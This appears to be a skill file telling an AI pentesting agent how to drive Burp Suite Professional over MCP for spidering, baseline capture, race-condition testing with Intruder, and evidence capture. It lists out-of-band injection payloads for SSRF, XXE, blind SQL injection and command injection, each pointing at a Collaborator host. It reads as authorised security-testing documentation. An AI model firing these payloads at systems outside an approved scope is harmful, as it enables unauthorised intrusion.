---
name: burp-mcp
description: Burp Suite Professional integration via MCP server. Provides HTTP request crafting, Intruder for race conditions, passive scanning, Collaborator for OOB testing, proxy history analysis, and structured request/response capture. Use during all phases — Phase 1 for proxy history analysis, Phase 2 for baseline capture, Phase 3 for vulnerability testing (especially race conditions and OOB), Phase 4 for clean PoC evidence. The Burp MCP server runs on http://127.0.0.1:9876/sse and is configured in opencode.json.
---

# Burp Suite MCP — Professional HTTP Testing Integration

## What This Skill Is

Burp Suite Professional connected to the agent via MCP (Model Context Protocol). This gives the agent direct access to Burp's HTTP request engine, Intruder, Collaborator, proxy history, and scanner — without manually copy-pasting between Burp and the terminal.

## Connection

The Burp MCP extension runs as an SSE server on `http://127.0.0.1:9876/sse`. It is pre-configured in `opencode.json`. Verify it is connected:

```
# From opencode, ask:
"Check if Burp MCP is connected by listing available tools."
```

## Available Tools (27 total)

### Core HTTP Request Tools

| Tool | Use For | Phase |
|------|---------|-------|
| `send_http1_request` | Send any HTTP/1.1 request with full control | All phases |
| `send_http2_request` | Send HTTP/2 requests (pseudo-headers) | Phase 2-3 |
| `create_repeater_tab` | Create Burp Repeater tab for manual iteration | Phase 3 |
| `create_repeater_tab_http2` | Same for HTTP/2 | Phase 3 |
| `send_to_intruder` | Send request to Intruder for fuzzing/race conditions | Phase 3 |

### Encoding/Decoding

| Tool | Use For |
|------|---------|
| `url_encode` | Encode payloads for URL context |
| `url_decode` | Decode captured values |
| `base64_encode` | Encode for Base64 contexts (JWT, cookies) |
| `base64_decode` | Decode JWT payloads, Base64 cookies |
| `generate_random_string` | Generate unique markers for reflection testing |

### Proxy History (Passive Analysis)

| Tool | Use For | Phase |
|------|---------|-------|
| `get_proxy_http_history` | List all requests Burp has seen | Phase 1-2 |
| `get_proxy_http_history_regex` | Filter history by pattern | Phase 1-2 |
| `get_proxy_websocket_history` | List WebSocket messages | Phase 2-3 |
| `get_proxy_websocket_history_regex` | Filter WebSocket by pattern | Phase 3 |

### Collaborator (OOB Testing) — Pro Only

| Tool | Use For | Phase |
|------|---------|-------|
| `generate_collaborator_payload` | Generate OOB payload for blind SSRF/XXE/SQLi | Phase 3 |
| `get_collaborator_interactions` | Poll for DNS/HTTP/SMTP callbacks | Phase 3 |

### Scanner (Passive) — Pro Only

| Tool | Use For | Phase |
|------|---------|-------|
| `get_scanner_issues` | List issues Burp's passive scanner found | Phase 2-3 |

### Editor / Intercept

| Tool | Use For |
|------|---------|
| `get_active_editor_contents` | Read current request in Burp editor |
| `set_active_editor_contents` | Write modified request to Burp editor |
| `set_proxy_intercept_state` | Enable/disable proxy intercept |

### Configuration

| Tool | Use For |
|------|---------|
| `output_project_options` | Export Burp project config |
| `output_user_options` | Export Burp user config |
| `set_task_execution_engine_state` | Pause/unpause task engine |

---

## Phase-Specific Usage

### Phase 1: Spidering — Proxy History Mining

Route all spider tool traffic through Burp's proxy for passive analysis:

```
# Configure curl to proxy through Burp (add to all spider commands)
curl --proxy http://127.0.0.1:8080 ...

# After spidering completes, mine the proxy history:
# Use get_proxy_http_history to find endpoints the spider missed
# (AJAX calls, WebSocket upgrades, redirect chains)
```

**Key workflow:**
1. Run `spider.sh` with `--proxy http://127.0.0.1:8080` (all requests pass through Burp)
2. Use `get_proxy_http_history` to extract the full request log
3. Look for API calls, AJAX endpoints, WebSocket connections that the spider's HTML parser missed
4. Use `get_proxy_http_history_regex` to filter for interesting patterns:
   - `".*api.*"` — all API calls
   - `".*token.*|.*auth.*"` — auth-related requests
   - `".*upload.*|.*file.*"` — file operations

### Phase 2: Mapping — Structured Baseline Capture

Use `send_http1_request` for precise baseline capture:

```
# Capture baseline with full request/response visibility
# This gives exact bytes, headers, timing — better than curl
send_http1_request with:
  - Exact URL
  - All headers
  - Auth cookies
  - Body (for POST/PUT)

# Then use get_scanner_issues to check if Burp's passive scanner
# flagged anything in the baseline responses
```

**Advantages over curl for mapping:**
- Burp records exact request/response bytes (no truncation)
- Passive scanner runs automatically on every request
- History is searchable and filterable
- WebSocket history captured separately

### Phase 3: Testing — The Power Tools

#### Race Conditions via Intruder

This is the #1 use case for Burp MCP. The framework previously could NOT test race conditions. Now:

```
# 1. Send the target request to Intruder
send_to_intruder with the state-changing request

# 2. Configure Intruder for race condition testing:
#    - Payload type: Null payloads
#    - Payload count: 50 (50 concurrent requests)
#    - Attack type: Null payloads (send same request N times)

# 3. Analyze results:
#    - If multiple requests succeed where only one should → race condition confirmed
#    - Example: gift card redemption succeeded 3 times instead of 1
```

#### OOB Testing via Collaborator

For blind vulnerabilities where the response doesn't contain the result:

```
# 1. Generate a Collaborator payload
generate_collaborator_payload → returns something like "abc123.oastify.com"

# 2. Use the payload in your test:
#    - SSRF: url=http://abc123.oastify.com
#    - XXE: <!ENTITY xxe SYSTEM "http://abc123.oastify.com">
#    - Blind SQLi: UNION SELECT load_file('//abc123.oastify.com/a')
#    - Blind Command Injection: ; curl abc123.oastify.com

# 3. Poll for interactions
get_collaborator_interactions → check for DNS/HTTP callbacks

# 4. If callback received → blind vulnerability confirmed
```

#### Precise Request Crafting

For testing that requires exact request control:

```
# Use send_http1_request for:
# - HTTP smuggling (CL.TE, TE.CL)
# - Host header injection
# - Request method switching
# - Custom header injection
# - Content-Type confusion attacks
```

### Phase 4: Validation — Clean Evidence Capture

Use Burp for report-ready evidence:

```
# 1. Create Repeater tab with the exact reproduction request
create_repeater_tab with the vulnerability demonstration

# 2. Send it and capture the clean response
# Burp shows exact request/response with headers

# 3. Use the exact bytes from Burp for the report
# No truncation, no curl formatting issues
```

---

## Proxy Routing Setup

To route all framework tool traffic through Burp for passive scanning:

```bash
# Set proxy for all curl commands (add to spider.sh, path_fuzzer.sh, etc.)
export http_proxy=http://127.0.0.1:8080
export https_proxy=http://127.0.0.1:8080

# Or add --proxy to individual commands:
curl --proxy http://127.0.0.1:8080 https://target.com/api/...

# For Python scripts:
export HTTP_PROXY=http://127.0.0.1:8080
export HTTPS_PROXY=http://127.0.0.1:8080
```

---

## When to Use Burp MCP vs curl

| Situation | Use |
|-----------|-----|
| Simple GET/POST testing | curl (faster, simpler) |
| Race condition testing | Burp Intruder (concurrent requests) |
| OOB/blind vulnerability testing | Burp Collaborator |
| HTTP smuggling | Burp send_http1_request (exact byte control) |
| Request/response evidence capture | Burp Repeater tab |
| Passive scanning safety net | Burp proxy (routes all traffic) |
| Proxy history mining | Burp get_proxy_http_history |
| WebSocket testing | Burp get_proxy_websocket_history |
| Exact response comparison | Burp (preserves exact bytes) |

---

## Target Approval System

Burp MCP has a configurable target approval system. When `send_http1_request` is called:
- If the target host is in the approved list → request goes through
- If not → Burp asks for approval

**Setup:** In Burp's MCP tab, add your target domains to the approved hosts list before starting the engagement. This prevents accidental out-of-scope requests.

---

## Cross-Skill Links

- [[recon]] — Route spider traffic through Burp proxy for passive analysis
- [[mapping]] — Use send_http1_request for precise baseline capture
- [[race-condition]] — Use send_to_intruder for concurrent request testing
- [[ssrf]] — Use generate_collaborator_payload for OOB confirmation
- [[xxe]] — Use Collaborator for blind XXE detection
- [[sqli]] — Use Collaborator for blind SQLi OOB confirmation
- [[http-smuggling]] — Use send_http1_request for exact byte-level control
- [[report-writing]] — Use Repeater tabs for clean evidence capture
